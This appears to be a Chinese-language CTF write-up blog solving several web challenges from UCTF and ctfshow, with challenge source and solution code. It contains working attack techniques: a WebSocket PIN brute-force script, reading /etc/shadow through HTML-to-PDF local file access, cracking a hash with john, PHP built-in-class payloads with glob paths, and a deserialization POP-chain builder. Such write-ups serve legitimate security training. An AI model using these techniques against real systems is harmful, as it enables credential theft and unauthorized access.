<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;&gt;</span><br><span class="line">&lt;title&gt;Real_Flag In Here!!!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	echo &quot;咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！&quot;;</span><br><span class="line">	$f4ke_flag = &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;;</span><br><span class="line">	$rea1_f1114g = &quot;flag&#123;1eb6eced-92b6-4c5c-80e1-0857048c670f&#125;&quot;;</span><br><span class="line">	unset($rea1_f1114g);</span><br></pre></td></tr></table></figure>

<h1 id="UCTF"><a href="#UCTF" class="headerlink" title="UCTF"></a>UCTF</h1><h2 id="web1-Websocket"><a href="#web1-Websocket" class="headerlink" title="web1 Websocket"></a>web1 Websocket</h2><p>题目源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div class=&quot;content&quot;&gt;</span><br><span class="line">		</span><br><span class="line">			</span><br><span class="line">&lt;div class=&quot;topbox&quot;&gt;</span><br><span class="line">	&lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="line">	&lt;span class=&quot;error&quot;&gt;&lt;/span&gt;</span><br><span class="line">	&lt;form method=&quot;post&quot;&gt;</span><br><span class="line">		&lt;input name=&quot;username&quot; type=&quot;text&quot; placeholder=&quot;Username&quot; required=&quot;&quot;&gt; </span><br><span class="line">		&lt;!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can&#x27;t remember jack --&gt;</span><br><span class="line">		&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;PIN&quot; required=&quot;&quot; pattern=&quot;(\d&#123;3&#125;|\d&#123;16&#125;)&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;script src=&quot;/static/login.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div id=&quot;footer&quot;&gt;</span><br><span class="line">			</span><br><span class="line">			&lt;a href=&quot;/internal/login&quot;&gt;Employee login&lt;/a&gt;</span><br><span class="line">			</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>出题方向是非常简单的弱密码爆破，但使用的是socket模块递送数据，需要使用JavaScript脚本解题<br>爆破脚本</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> WebSocket = <span class="built_in">require</span>(<span class="string">&#x27;ws&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pinbuild</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pin=<span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;<span class="number">10</span>)&#123;</span><br><span class="line">            pin[i]=<span class="string">&quot;00&quot;</span>+i;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i&lt;<span class="number">100</span>)&#123;</span><br><span class="line">            pin[i]=<span class="string">&quot;0&quot;</span>+i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            pin[i]=i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pin;</span><br><span class="line">&#125;</span><br><span class="line">pins=pinbuild(<span class="number">1000</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> step = <span class="number">0</span>; step &lt; pins.length; step++) &#123;</span><br><span class="line">  checkPassword(pins[step]);</span><br><span class="line">  <span class="built_in">console</span>.log(step);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPassword</span>(<span class="params">maybePin</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://web1.utctf.live:8651//internal/ws&quot;</span>)</span><br><span class="line">    socket.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (event.data == <span class="string">&quot;begin&quot;</span>) &#123;</span><br><span class="line">            socket.send(<span class="string">&quot;begin&quot;</span>);</span><br><span class="line">            socket.send(<span class="string">&quot;user admin&quot;</span>)</span><br><span class="line">            socket.send(<span class="string">&quot;pass &quot;</span>+maybePin)</span><br><span class="line">        &#125;  <span class="keyword">else</span> <span class="keyword">if</span> (event.data == <span class="string">&quot;badpass&quot;</span>) &#123;</span><br><span class="line">            socket.close()</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (event.data.startsWith(<span class="string">&quot;session &quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;Found the pin:&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(maybePin);</span><br><span class="line">            socket.close()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>获得pin码：907<br>得到flag</p>
<h2 id="web2-HTML2PDF"><a href="#web2-HTML2PDF" class="headerlink" title="web2 HTML2PDF"></a>web2 HTML2PDF</h2><p>将html转为pdf，可以执行js脚本<br>复原源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> pdfkit </span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> spwd </span><br><span class="line"><span class="keyword">import</span> crypt </span><br><span class="line"><span class="keyword">from</span> hmac <span class="keyword">import</span> compare_digest <span class="keyword">as</span> compare_hash </span><br><span class="line">app =Flask(__name__) @app.route(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> </span><br><span class="line">	<span class="keyword">if</span> request.method ==<span class="string">&#x27;POST&#x27;</span>: </span><br><span class="line">    	html_content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> html_content <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line">    	<span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/environ&#x27;</span> <span class="keyword">in</span> html_content: </span><br><span class="line">    	<span class="comment"># Don&#x27;t let them read the flag from/proc//environ </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Aren&#x27;</span><span class="string">&#x27;t you sneaky? That&#x27;</span><span class="string">&#x27;s a good idea, but not the intended solution, so keeptrying :)&#x27;</span> <span class="comment"># </span></span><br><span class="line">    Filenames. html =render_template(<span class="string">&#x27;document.html&#x27;</span>,content=html_content) uid = <span class="built_in">str</span>(<span class="built_in">hash</span>(time.time())) <span class="comment">#Using a hash of the time ensures unique filenames between requests. </span></span><br><span class="line">    out_filename = uid+<span class="string">&#x27;.pdf&#x27;</span></span><br><span class="line">html_filename = uid+<span class="string">&#x27;.html&#x27;</span> html_file = <span class="built_in">open</span>(html_filename,<span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">html_file.write(html)</span><br><span class="line">html_file.close() </span><br><span class="line"><span class="comment"># Generate PDF. </span></span><br><span class="line">TIMEOUT = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">subprocess.run([<span class="string">&#x27;xvfb-run&#x27;</span>,<span class="string">&#x27;timeout&#x27;</span>,<span class="string">&#x27;--preservestatus&#x27;</span>,<span class="string">&#x27;-k&#x27;</span>,TIMEOUT,TIMEOUT,<span class="string">&#x27;wkhtmltopdf&#x27;</span>,<span class="string">&#x27;--enable-local-file-access&#x27;</span>, html_filename,out_filename]) </span><br><span class="line"><span class="comment"># Cleanup and return result.</span></span><br><span class="line">out_file =<span class="built_in">open</span>(out_filename,<span class="string">&#x27;rb&#x27;</span>) output = out_file.read()</span><br><span class="line">out_file.close() <span class="comment">#os.remove(out_filename)</span></span><br><span class="line"><span class="comment">#os.remove(html_filename) response =make_response(output) response.headers[&#x27;ContentType&#x27;] = &#x27;application/pdf&#x27; response.headers[&#x27;ContentDisposition&#x27;] = &#x27;inline; filename=document.pdf&#x27;</span></span><br><span class="line"><span class="keyword">return</span> response <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adminLogin</span>():</span> <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">username = request.form.get(<span class="string">&#x27;username&#x27;</span>) password =request.form.get(<span class="string">&#x27;password&#x27;</span>) </span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> password <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>) <span class="comment"># Check that username and password match a user in the system. </span></span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">    	pw1 = spwd.getspnam(username).sp_pwd </span><br><span class="line">    	pw2 = crypt.crypt(password, pw1) </span><br><span class="line">        <span class="keyword">if</span> compare_hash(pw2,pw1): </span><br><span class="line">        	<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>,msg=os.environ[<span class="string">&#x27;FLAG&#x27;</span>]) </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">        	<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=<span class="string">&#x27;Incorrect password!&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> KeyError: <span class="comment"># No such username.</span></span><br><span class="line">			<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=<span class="string">&#x27;Incorrect username!&#x27;</span>) </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>) </span><br><span class="line">if__name__ == <span class="string">&#x27;__main__&#x27;</span>: app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>禁用了<code>/environ</code><br>需要登录admin账号获得flag<br>查看<code>/etc/shadow</code><br>etc/shadow是一个密码储存文件</p>
<ol>
<li>账户名：账户名与/etc/passwd里面的账户名是一一对应的关系。</li>
<li>密码：这里可以看到3类，分别是奇奇怪怪的字符串、*和！！其中，奇奇怪怪的字符串就是加密过的密码文件。星号代表帐号被锁定，双叹号表示这个密码已经过期了。奇奇怪怪的字符串是以$6$开头的，表明是用SHA-512加密的，$1$ 表明是用MD5加密的、$2$ 是用Blowfish加密的、$5$是用 SHA-256加密的。</li>
<li>修改日期：这个是表明上一次修改密码的日期与1970-1-1相距的天数密码不可改的天数：假如这个数字是8，则8天内不可改密码，如果是0，则随时可以改。</li>
<li>密码需要修改的期限：如果是99999则永远不用改。如果是其其他数字比如12345，那么必须在距离1970-1-1的12345天内修改密码，否则密码失效。</li>
<li>修改期限前N天发出警告：比如你在第五条规定今年6月20号规定密码必须被修改，系统会从距离6-20号的N天前向对应的用户发出警告。</li>
<li>密码过期的宽限：假设这个数字被设定为M，那么帐号过期的M天内修改密码是可以修改的，改了之后账户可以继续使用。</li>
<li>帐号失效日期：假设这个日期为X，与第三条一样，X表示的日期依然是1970-1-1相距的天数，过了X之后，帐号失效。</li>
<li>保留：被保留项，暂时还没有被用上。</li>
<li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root:*:19052:0:99999:7::: daemon:*:19052:0:99999:7::: bin:*:19052:0:99999:7:::</span><br><span class="line">sys:*:19052:0:99999:7::: sync:*:19052:0:99999:7::: games:*:19052:0:99999:7:::</span><br><span class="line">man:*:19052:0:99999:7::: lp:*:19052:0:99999:7::: mail:*:19052:0:99999:7:::</span><br><span class="line">news:*:19052:0:99999:7::: uucp:*:19052:0:99999:7::: proxy:*:19052:0:99999:7:::</span><br><span class="line">www-data:*:19052:0:99999:7::: backup:*:19052:0:99999:7:::</span><br><span class="line">list:*:19052:0:99999:7::: irc:*:19052:0:99999:7::: gnats:*:19052:0:99999:7:::</span><br><span class="line">nobody:*:19052:0:99999:7::: _apt:*:19052:0:99999:7::: systemd- network:*:19062:0:99999:7::: systemd-resolve:*:19062:0:99999:7:::</span><br><span class="line">messagebus:*:19062:0:99999:7::: avahi:*:19062:0:99999:7:::</span><br><span class="line">geoclue:*:19062:0:99999:7:::</span><br><span class="line">dave:$1$M.bfkUDw$jjybwVXMb4waSV0fY5gp0/:19062:0:99999:7:::</span><br><span class="line">john:$1$EPS/Rl3g$5TLupCmddYSibyDaZtZhQ0:19062:0:99999:7:::</span><br><span class="line">emma:$1$iasayt59$U1QnVGaDEJKyps3iHWv2P1:19062:0:99999:7:::</span><br><span class="line">WeakPasswordAdmin:$1$Rj9G/TPc$e5k/QAhlagK6pxGyfQNJ5.:19062:0:99999:7:::</span><br></pre></td></tr></table></figure>
存在一个weakPasswordAdmin账号<br>提示弱密码<br>使用john爆破<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john passwd.txt -w -rules </span><br></pre></td></tr></table></figure>
得到<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sunshine</span><br></pre></td></tr></table></figure>
登录admin界面<br>输入账户密码<br>得到flag<h2 id="esayweb"><a href="#esayweb" class="headerlink" title="esayweb"></a>esayweb</h2>打开网页源码<br>发现提示<code>?source</code><br>输入对应参数<br>得到php源码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo &quot;\$flag_filename = &#x27;flag&#x27;.md5(???).&#x27;php&#x27;;&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&#x27;a&#x27;]) &amp;&amp; isset($_POST[&#x27;b&#x27;]) &amp;&amp; isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_POST[&#x27;c&#x27;];</span><br><span class="line">    $count[++$c] = 1;</span><br><span class="line">    if($count[] = 1) &#123;</span><br><span class="line">        $count[++$c] = 1;</span><br><span class="line">        print_r($count);</span><br><span class="line">        die();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $a = $_POST[&#x27;a&#x27;];</span><br><span class="line">        $b = $_POST[&#x27;b&#x27;];</span><br><span class="line">        echo new $a($b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;easyweb&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;stars&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;stars2&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;stars3&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;text&quot;&gt;</span><br><span class="line">    &lt;body&gt;&lt;p style=&quot;position: relative;bottom:100px;&quot;&gt;&lt;font size=&quot;15&quot;&gt;so easy，just soso&lt;/font&gt;&lt;/p&gt;&lt;/body&gt;</span><br><span class="line">    &lt;style&gt;body&#123;text-align:center&#125;&lt;/style&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!--?source--&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">$flag_filename = &#x27;flag&#x27;.md5(???).&#x27;php&#x27;;</span><br></pre></td></tr></table></figure>
提示了flag的文件名，猜测需要获得MD5原值或者正则匹配文件名<br>使用数组溢出绕过<code>$count</code><br>php数组上线为<code>2^61</code><br>函数名可定义，参数可定义<br>使用内置类利用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=DirectoryIterator&amp;b=glob://flag[0-9a-z]*.php&amp;c=9223372036854775806</span><br></pre></td></tr></table></figure>
得到flag文件名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag56ea8b83122449e814e0fd7bfb5f220a.php</span><br></pre></td></tr></table></figure>
打开文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=SplFileObject&amp;b=flag56ea8b83122449e814e0fd7bfb5f220a.php&amp;c=9223372036854775806</span><br></pre></td></tr></table></figure>
得到flag<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?php $flag = &quot;ctfshow&#123;e1b7ba24-7e6e-41cb-9e3e-a4846e61527a&#125;&quot;; ?</span><br></pre></td></tr></table></figure>
<h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy unserialize"></a>easy unserialize</h2>源码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;./HappyYear.php&quot;);</span><br><span class="line">class one &#123;</span><br><span class="line">    public $object;</span><br><span class="line"></span><br><span class="line">    public function MeMeMe() &#123;</span><br><span class="line">        array_walk($this, function($fn, $prev)&#123;</span><br><span class="line">            if ($fn[0] === &quot;Happy_func&quot; &amp;&amp; $prev === &quot;year_parm&quot;) &#123;</span><br><span class="line">                global $talk;</span><br><span class="line">                echo &quot;$talk&quot;.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">                global $flag;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        @$this-&gt;object-&gt;add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString() &#123;</span><br><span class="line">        return $this-&gt;object-&gt;string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class second &#123;</span><br><span class="line">    protected $filename;</span><br><span class="line"></span><br><span class="line">    protected function addMe() &#123;</span><br><span class="line">        return &quot;Wow you have sovled&quot;.$this-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($func, $args) &#123;</span><br><span class="line">        call_user_func([$this, $func.&quot;Me&quot;], $args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class third &#123;</span><br><span class="line">    private $string;</span><br><span class="line"></span><br><span class="line">    public function __construct($string) &#123;</span><br><span class="line">        $this-&gt;string = $string;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name) &#123;</span><br><span class="line">        $var = $this-&gt;$name;</span><br><span class="line">        $var[$name]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&quot;ctfshow&quot;])) &#123;</span><br><span class="line">    $a=unserialize($_GET[&#x27;ctfshow&#x27;]);</span><br><span class="line">    throw new Exception(&quot;高一新生报道&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>源码分析<br>目标：调用MeMeMe方法<br>step1：__destruct()魔术方法在函数自然结束和销毁时可调用<br>step2：__call()在调用一个不存在的方法时触发可以跳转到second<br>step3：<code>call_user_func([$this, $func.&quot;Me&quot;], $args);</code>可以转到addMe函数<br>step4：”Wow you have sovled”.$this-&gt;filename一个字符串的拼接，和__toString存在关联<br>step5：arrywalk功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class one &#123;</span><br><span class="line">    public $object=&quot;sdl&quot;;</span><br><span class="line">    public $object2=&quot;sdl2&quot;;</span><br><span class="line">    public function MeMeMe() &#123;</span><br><span class="line">        array_walk($this, function($fn, $prev)&#123;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;.$fn.&#x27;|&#x27;.$prev.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new one();</span><br><span class="line">$a-&gt;MeMeMe();</span><br><span class="line"></span><br><span class="line">sdl|object</span><br><span class="line"></span><br><span class="line">sdl2|object2</span><br></pre></td></tr></table></figure>
<p>遍历数组中的变量名和值<br>STEP6:建立一个变量year_parm-&gt;’Happy_func’<br>step7:调用MeMeMe函数，使用数组调用类方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class one &#123;</span><br><span class="line">    public $object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class second &#123;</span><br><span class="line">    protected $filename;</span><br><span class="line">    public function __construct($filename)&#123;</span><br><span class="line">        $this-&gt;filename=$filename;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class third &#123;</span><br><span class="line">    private $string;</span><br><span class="line"></span><br><span class="line">    public function __construct($string) &#123;</span><br><span class="line">        $this-&gt;string = $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a3=new one();</span><br><span class="line">$a2=new one();</span><br><span class="line">$a1=new one();</span><br><span class="line">$a1-&gt;object=new second($a2);</span><br><span class="line">$a2-&gt;object=new third([&#x27;string&#x27;=&gt;[$a3,&#x27;MeMeMe&#x27;]]);</span><br><span class="line">$a3-&gt;year_parm=[&#x27;Happy_func&#x27;];</span><br><span class="line">echo (serialize($a1));</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
